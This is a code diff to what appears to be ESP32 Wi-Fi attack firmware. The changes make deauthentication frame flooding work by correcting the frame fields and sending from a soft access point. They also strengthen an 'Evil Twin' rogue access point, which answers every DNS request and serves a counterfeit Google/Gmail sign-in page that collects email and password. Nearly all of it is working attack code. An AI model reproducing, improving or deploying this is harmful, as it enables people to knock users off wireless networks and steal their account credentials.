@@ -236,15 +236,18 @@ static File sniff_pcap_file;
 
 static uint8_t deauth_frame[26] = {
     0xC0, 0x00,
-    0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x07, 0x00
+    0x3a, 0x01,                         
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0xf0, 0xff,                         
+    0x02, 0x00                          
 };
 
-const char* DEFAULT_GOOGLE_HTML = 
+static const char GOOGLE_LOGO_B64[] =
+    "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MiIgaGVpZ2h0PSIyNCI+PHRleHQgeT0iMjAiIGZvbnQtc2l6ZT0iMjIiIGZvbnQtZmFtaWx5PSdBcmlhbCxzYW5zLXNlcmlmJyBmb250LXdlaWdodD0nYm9sZCc+PHTqc3BhbiBmaWxsPScjNDI4NUY0Jz5HPC90c3Bhbj48dHNwYW4gZmlsbD0nI0VBNDMzNSc+bzwvdHNwYW4+PHRzcGFuIGZpbGw9JyNGQkJDMDQnPm88L3RzcGFuPjx0c3BhbiBmaWxsPScjNDI4NUY0Jz5nPC90c3Bhbj48dHNwYW4gZmlsbD0nIzM0QTg1Myc+bDwvdHNwYW4+PHRzcGFuIGZpbGw9JyNFQTQzMzUnPmU8L3RzcGFuPjwvdGV4dD48L3N2Zz4=";
+
+const char* DEFAULT_GOOGLE_HTML =
 "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
 "<style>body{font-family:Arial,sans-serif;background-color:#fff;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;height:100vh;box-sizing:border-box;}"
 ".container{width:100%;max-width:360px;border:1px solid #dadce0;border-radius:8px;padding:40px 24px;text-align:center;}"
@@ -254,7 +257,12 @@ const char* DEFAULT_GOOGLE_HTML =
 "input:focus{border-color:#1a73e8;outline:none;}"
 "button{background-color:#1a73e8;color:white;border:none;padding:12px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;width:100%;margin-top:20px;}"
 "button:hover{background-color:#1557b0;}</style></head><body>"
-"<div class='container'><img src='https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg' style='height:24px;margin-bottom:24px;' alt='Google'>"
+"<div class='container'>"
+"<svg xmlns='http://www.w3.org/2000/svg' width='92' height='30' style='margin-bottom:24px;display:block;margin-left:auto;margin-right:auto;'>"
+"<text y='26' font-size='26' font-family='Arial,sans-serif' font-weight='bold'>"
+"<tspan fill='#4285F4'>G</tspan><tspan fill='#EA4335'>o</tspan><tspan fill='#FBBC04'>o</tspan>"
+"<tspan fill='#4285F4'>g</tspan><tspan fill='#34A853'>l</tspan><tspan fill='#EA4335'>e</tspan>"
+"</text></svg>"
 "<h2>Sign in</h2><p>to continue to Gmail</p>"
 "<form action='/login' method='POST'>"
 "<input type='text' name='email' placeholder='Email or phone' required>"
@@ -539,6 +547,7 @@ static void stop_ble_scan(void) {
 
 static void start_deauth(void) {
     was_web_server_active = web_server_is_active();
+    web_server_stop();
     Serial.printf("[RECON] Starting deauth: BSSID=%s CH=%d\n", deauth_bssid, deauth_channel);
 
     uint8_t bssid_bytes[6];
@@ -546,11 +555,12 @@ static void start_deauth(void) {
     memcpy(deauth_frame + 10, bssid_bytes, 6);
     memcpy(deauth_frame + 16, bssid_bytes, 6);
 
+    
     WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-
-    esp_wifi_set_promiscuous(true);
+    WiFi.mode(WIFI_AP_STA);
+    vTaskDelay(pdMS_TO_TICKS(100));
+    WiFi.softAP("", nullptr, deauth_channel, 1, 4); 
+    vTaskDelay(pdMS_TO_TICKS(50));
     esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
 
     deauth_frames_sent = 0;
@@ -559,24 +569,21 @@ static void start_deauth(void) {
 }
 
 static void poll_deauth(void) {
-    uint32_t now = millis();
-    if (now - deauth_last_burst_ms < DEAUTH_BURST_INTERVAL_MS) return;
-    deauth_last_burst_ms = now;
-
-    for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
-    }
-    deauth_frames_sent += DEAUTH_BURST_COUNT;
+    
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+    vTaskDelay(1 / portTICK_PERIOD_MS);
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+    vTaskDelay(1 / portTICK_PERIOD_MS);
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+    deauth_frames_sent += 3;
 }
 
 static void stop_deauth_and_restore(void) {
-    Serial.printf("[RECON] Deauth stopped. Restoring state...\n");
-    esp_wifi_set_promiscuous(false);
+    Serial.printf("[RECON] Deauth stopped after %d frames. Restoring state...\n", deauth_frames_sent);
+    WiFi.softAPdisconnect(true);
     if (was_web_server_active) {
-        WiFi.mode(WIFI_AP_STA);
         web_server_init();
     } else {
-        WiFi.disconnect(true);
         WiFi.mode(WIFI_OFF);
     }
     deauth_frames_sent = 0;
@@ -594,14 +601,14 @@ static void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
         if (subtype == 0x0C || subtype == 0x0A) deauth_detected_count++;
 
         if (bitgotchi_active && subtype == 0x08 && len > 16) {
-            // Check for PWNGRID friend beacon first
+            
             if (memcmp(frame + 10, PWNGRID_MAC, 6) == 0) {
                 bitgotchi_friends++;
                 snprintf(bitgotchi_last_event, sizeof(bitgotchi_last_event),
                          "Friend detected! Total: %d", bitgotchi_friends);
                 bitgotchi_new_event = true;
             } else {
-                // Parse SSID of general AP
+                
                 char ssid[33];
                 bitgotchi_parse_ssid(frame, len, ssid, sizeof(ssid));
                 if (strlen(ssid) > 0) {
@@ -901,14 +908,14 @@ static void poll_arp_scan(void) {
             struct netif* iface = netif_default;
             if (iface) {
                 ip4_addr_t target;
-                // lwIP stores IPs little-endian: for subnet x.y.z.0, host .N is stored as
-                // (N<<24 | z<<16 | y<<8 | x) so we must place the host index in the MSB
-                uint32_t net_le = arp_base; // already little-endian from the & operation
+                
+                
+                uint32_t net_le = arp_base; 
                 uint8_t a0 = (net_le      ) & 0xFF;
                 uint8_t a1 = (net_le >>  8) & 0xFF;
                 uint8_t a2 = (net_le >> 16) & 0xFF;
                 uint8_t host_idx = (uint8_t)(arp_scan_idx + 1);
-                // reconstruct little-endian: a3 = host_idx
+                
                 target.addr = (uint32_t)a0 | ((uint32_t)a1 << 8) | ((uint32_t)a2 << 16) | ((uint32_t)host_idx << 24);
                 etharp_request(iface, &target);
                 Serial.printf("[ARP] -> %d.%d.%d.%d\n", a0, a1, a2, host_idx);
@@ -1083,17 +1090,21 @@ static void start_evil_twin_server(void) {
     was_web_server_active = web_server_is_active();
     Serial.printf("[RECON] Starting Evil Twin server for \"%s\" on CH%d\n", et_ssid, et_channel);
     web_server_stop();
-    delay(200);
+    delay(300);
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
 
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_AP);
-    
+    delay(100);
+
     IPAddress apIP(172, 0, 0, 1);
     WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
     WiFi.softAP(et_ssid, NULL, et_channel);
 
-    dnsServer = new DNSServer();
-    dnsServer->start(53, "*", apIP);
+    
+    uint32_t t = millis();
+    while (millis() - t < 2000) yield();
 
     etServer = new AsyncWebServer(80);
 
@@ -1125,6 +1136,7 @@ static void start_evil_twin_server(void) {
         request->send(200, "text/html", "<h2>Authentication Error</h2><p>Please try again later.</p>");
     });
 
+    
     etServer->onNotFound([](AsyncWebServerRequest *request) {
         if (strlen(et_html_file_path) > 0 && SD.exists(et_html_file_path)) {
             request->send(SD, et_html_file_path, "text/html");
@@ -1136,6 +1148,9 @@ static void start_evil_twin_server(void) {
     etServer->begin();
 
     
+    dnsServer = new DNSServer();
+    dnsServer->start(53, "*", WiFi.softAPIP());
+
     uint8_t bssid_bytes[6];
     parse_bssid(et_target_bssid, bssid_bytes);
     memcpy(deauth_frame + 10, bssid_bytes, 6);
@@ -1144,6 +1159,7 @@ static void start_evil_twin_server(void) {
     et_deauth_last_ms = 0;
     deauth_frames_sent = 0;
     state = RECON_EVIL_TWIN;
+    Serial.printf("[RECON] Evil Twin ready. AP IP: %s\n", WiFi.softAPIP().toString().c_str());
 }
 
 static void poll_evil_twin(void) {
@@ -1154,13 +1170,10 @@ static void poll_evil_twin(void) {
     uint32_t now = millis();
     if (strlen(et_target_bssid) > 0 && (now - et_deauth_last_ms > 100)) {
         et_deauth_last_ms = now;
-        esp_wifi_set_promiscuous(true);
-        esp_wifi_set_channel(et_channel, WIFI_SECOND_CHAN_NONE);
         for (int i = 0; i < 5; i++) {
-            esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
         }
         deauth_frames_sent += 5;
-        esp_wifi_set_promiscuous(false);
     }
 }
 
